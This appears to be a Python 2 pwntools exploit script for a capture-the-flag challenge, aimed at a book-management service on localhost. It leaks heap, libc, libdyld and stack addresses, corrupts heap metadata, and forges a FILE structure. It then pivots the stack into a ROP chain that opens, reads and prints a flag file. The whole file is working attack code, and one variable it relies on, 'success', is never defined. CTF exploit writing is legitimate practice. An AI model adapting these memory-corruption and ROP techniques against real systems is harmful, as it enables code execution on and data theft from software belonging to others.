#!/usr/bin/env python

# python2
# pwntools

import signal
from pwn import *

HOST = 'localhost'
PORT = 19091

class TimeoutError(Exception):
    pass

def handler(signum, frame):
    raise TimeoutError()

# define timeout exception handler
signal.signal(signal.SIGALRM, handler)

def create_book(idx, name):
    r.sendlineafter('> ', '1')
    r.sendlineafter('Book index: ', str(idx))
    r.sendafter('Book name: ', name)

def read_book(idx):
    r.sendlineafter('> ', '3')
    r.sendlineafter('Book index: ', str(idx))

def remove_book(idx):
    r.sendlineafter('> ', '4')
    r.sendlineafter('Book index: ', str(idx))

def edit_book_name(idx, name):
    r.sendlineafter('> ', '2')
    r.sendlineafter('> ', '1')
    r.sendlineafter('Book index: ', str(idx))
    r.sendafter('Book new name: ', name)

def add_book_chapter(idx, title, content):
    r.sendlineafter('> ', '2')
    r.sendlineafter('> ', '2')
    r.sendlineafter('Book index: ', str(idx))
    r.sendafter('Chapter title: ', title)
    r.sendafter('Chapter content: ', content)

def save_book(idx):
    r.sendlineafter('> ', '5')
    r.sendlineafter('> ', '1')
    r.sendlineafter('Book index: ', str(idx))

def load_book(idx, filename):
    r.sendlineafter('> ', '5')
    r.sendlineafter('> ', '2')
    r.sendlineafter('Book name: ', filename)
    r.sendlineafter('Book index: ', str(idx))

def reload_book(idx):
    r.sendlineafter('> ', '5')
    r.sendlineafter('> ', '3')
    r.sendlineafter('Book index: ', str(idx))

# check if Chapter title is corrupted
def parse(count):
    for i in range(count+1):
        r.recvuntil('Chapter ')
        r.recvuntil(':', drop=True)
    for i in range(3, -1, -1):
        r.recvuntil('Chapter ')
        tmp = r.recvuntil(':', drop=True)
        if tmp != str(i):
            return tmp
    return ''

###### Exploit begins

'''
stdin FILE structure layout
0x7fff94737d90: 0x000000010100aa00 0x0000000000000000
0x7fff94737da0: 0x0000000000000885 0x000000010100aa00
0x7fff94737db0: 0x0000000000001000 0x0000000000000000
0x7fff94737dc0: 0x00007fff94737d90 0x00007fff6e0802ad
0x7fff94737dd0: 0x00007fff6e08027d 0x00007fff6e08029f
0x7fff94737de0: 0x00007fff6e08028e 0x0000000000000000
0x7fff94737df0: 0x0000000000000000 0x00007fff94737b00
0x7fff94737e00: 0x0000000000000000 0x0000000000000000
0x7fff94737e10: 0x0000000000000000 0x0000000000001000
0x7fff94737e20: 0x0000000000000000
'''

def leak(addr=0, leak_from_content=False, cont=False, libc_code=0, libc_data=0):
    global r
    while True:
        r = remote(HOST, PORT)

        saved_book = 0
        loaded_book = 1

        # intended bug that can leak tiny_heap address
        # you can calculate small_heap address with tiny_heap
        create_book(saved_book, 'a'*0x1f)
        save_book(saved_book)
        load_book(loaded_book, 'a'*0x1f)
        read_book(loaded_book)
        r.recvuntil('a'*0x1f+'\n')
        tiny_heap = u64(r.recv(6).ljust(8, '\x00'))
        status_heap = tiny_heap - 0x10
        log.info(hex(tiny_heap))
        tiny_heap = tiny_heap & 0xfffffffffff00000
        small_heap = tiny_heap + (8 - (((tiny_heap >> 20) & 0xf) % 8)) * 0x100000
        if tiny_heap & 0xff0000000000 != 0x7f0000000000:
            log.failure('leak failed, try again')
            r.close()
            continue

        # corrupting small_heap metadata with about 1/16 probability
        for i in range(4):
            add_book_chapter(saved_book, str(i), str(i))
        for i in range(2, 6):
            load_book(i, 'a'*0x1f)
        edit_book_name(loaded_book, 'a'*0x20 + p64(small_heap+0x800028)[:6])
        for i in [loaded_book, 2, 3, 4]:
            remove_book(i)

        # forge fp structure
        fp_close = libc_code + 0x402ad
        fp_read = libc_code + 0x4027d
        fp_seek = libc_code + 0x4029f
        fp_write = libc_code + 0x4028e
        
        _fp = p64(small_heap+0x809230) + p64(0)
        _fp += p16(0x885) + p16(0) + p32(0) + p64(small_heap+0x809230)
        _fp += p64(0x1000) + p64(0)
        _fp += p64(small_heap+0x809230) + p64(fp_close)
        _fp += p64(fp_read) + p64(fp_seek)
        _fp += p64(fp_write) + p64(0)
        _fp += p64(0) + p64(libc_data+0x3040)
        _fp += p64(0) + p64(0)
        _fp += p64(0) + p64(0x1000)
        _fp += p64(0)

        # create rop
        '''
        0x0000000000001e66: pop rdi; pop rbp; ret;
        0x0000000000002495: pop rsi; pop rbp; ret; 
        0x0000000000001e67: pop rbp; ret;
        0x00000000000680a6: mov rdx, rax; call qword ptr [rbp - 0x60];
        '''

        pop_rdi = libc_code+0x1e66
        pop_rsi = libc_code+0x2495
        pop_rbp = libc_code+0x1e67
        mov_rdx_rax = libc_code+0x680a6

        fopen = libc_code+0x39fe9
        fgets = libc_code+0x3948a
        puts = libc_code+0x3f630

        buf = small_heap+0x809230-0x10-0x3f8
        flag_offset = buf+0x100
        flagname = '../../flag\x00r\x00'

        _rop = p64(0)
        _rop += p64(pop_rdi) + p64(flag_offset) + p64(0)
        _rop += p64(pop_rsi) + p64(flag_offset+len(flagname)-2) + p64(0)
        _rop += p64(fopen)
        _rop += p64(pop_rbp) + p64(buf+8*11+0x60)
        _rop += p64(mov_rdx_rax) + p64(pop_rsi)
        _rop += p64(pop_rdi) + p64(buf+0x1000) + p64(0)
        _rop += p64(pop_rsi) + p64(0x1000) + p64(0)
        _rop += p64(fgets)
        _rop += p64(pop_rdi) + p64(buf+0x1000) + p64(0)
        _rop += p64(puts)

        _rop = _rop.ljust(0x100, '\x00') + flagname

        try:
            signal.alarm(40)
            corrupted = ''
            for i in range(26):
                if addr == 0:
                    # 1/4 probability leak Book structure fp pointer on tiny_heap
                    add_book_chapter(saved_book, chr(ord('A')+i)*0x20, chr(ord('A')+i)*0x3f8 + p64(status_heap-0x18))
                else:
                    add_book_chapter(saved_book, chr(ord('A')+i)*0x20, _rop + chr(ord('A')+i)*(0x3f8-len(_rop)) + p64(addr) + p64(0) + _fp)
                read_book(saved_book)
                corrupted = parse(i)
                if corrupted:
                    break
            signal.alarm(0)
        except TimeoutError:
            pass

        if corrupted == '':
            log.failure('Failed corruption, try again')
            r.close()
            continue

        # corruption success
        leak_address = 0
        try:
            signal.alarm(2)
            if not leak_from_content:
                r.recvuntil('Chapter ')
                leak_address = u64(r.recvuntil(':', drop=True).ljust(8, '\x00'))
            else:
                r.recvuntil('Chapter : ')
                leak_address = u64(r.recv(6).ljust(8, '\x00'))
            signal.alarm(0)
        except TimeoutError:
            pass

        if leak_address == 0:
            log.failure('Failed to leak address, try again')
            r.close()
            continue

        if not cont:
            r.close()
        break
    return leak_address, tiny_heap, small_heap, status_heap

# we can leak library pointers in different sessions due to shared cache
# leak fp pointer from 
fp = leak()[0]
log.success('fp: ' + hex(fp))
libc_data = fp - 0x7300

# leak libc_code base from fp
libc_code = leak(addr=fp+0x38)[0] - 0x402ad
log.success('libc_code: ' + hex(libc_code))

# leak libdyld_data
libdyld_data = leak(addr=libc_data+0x2228)[0] - 0x3670
log.success('libdyld_data: ' + hex(libdyld_data))
environ = libdyld_data + 0x3668

for stack_offset in [0x30, 0x38]:
    while True:
        try:
            # leak stack address from environ
            stack, tiny_heap, small_heap, status_heap = leak(addr=environ, cont=True, libc_code=libc_code, libc_data=libc_data)

            log.info('Done leaking')
            log.success('tiny_heap: ' + hex(tiny_heap))
            log.success('small_heap: ' + hex(small_heap))
            log.success('fp: ' + hex(fp))
            log.success('libc_data: ' + hex(libc_data))
            log.success('libdyld_data: ' + hex(libdyld_data))
            log.success('environ: ' + hex(environ))
            log.success('libc_code: ' + hex(libc_code))
            log.success('stack: ' + hex(stack))
            log.success('fake_fp: ' + hex(small_heap+0x809230))
            log.success('status_heap: ' + hex(status_heap))

            # set bit to overflow fp pointer
            offset = [2, 1, 8]
            cnt = 0
            for i in range(2, 5):
                if (status_heap+0x10*i) & 0xff == 0:
                    continue
                edit_book_name(i, 'A'*0x20 + p64(status_heap-0x18-offset[cnt])[:6])
                create_book(i, 'B')
                cnt += 1

            if not success:
                log.failure('something wrong, try again')
                r.close()
                continue

            # overflow fp pointer
            edit_book_name(5, 'A'*0x20 + p64(status_heap+0x50) + p64(small_heap+0x809230)[:6])

            # replace fp buf to stack
            reload_book(5)
            offset = stack_offset # stack offset might be different
            _fp = p64(stack-offset) + p64(0)
            _fp += p16(0x885) + p16(0) + p32(0) + p64(stack-offset)
            r.sendline(_fp)
            sleep(1)
            r.sendline(_fp)
            r.sendline()

            # overwrite rbp and ret address
            leave_ret = libc_code + 0x1ba9

            reload_book(5)
            payload = p64(small_heap+0x809230-0x10-0x3f8) + p64(leave_ret)
            r.sendline(payload)
            r.sendline(payload)
        except EOFError:
            log.failure('failed to reload fp, try again')
            r.close()
            continue

        # success
        break

    # trigger ROP
    r.sendlineafter('> ', '6')
    r.recvuntil('bye~\n')
    try:
        flag = r.recvline().strip()
        if '}' in flag:
            print flag
            break
    except EOFError:
        log.failure('failed to get flag, changing stack_offset and try again')
        r.close()
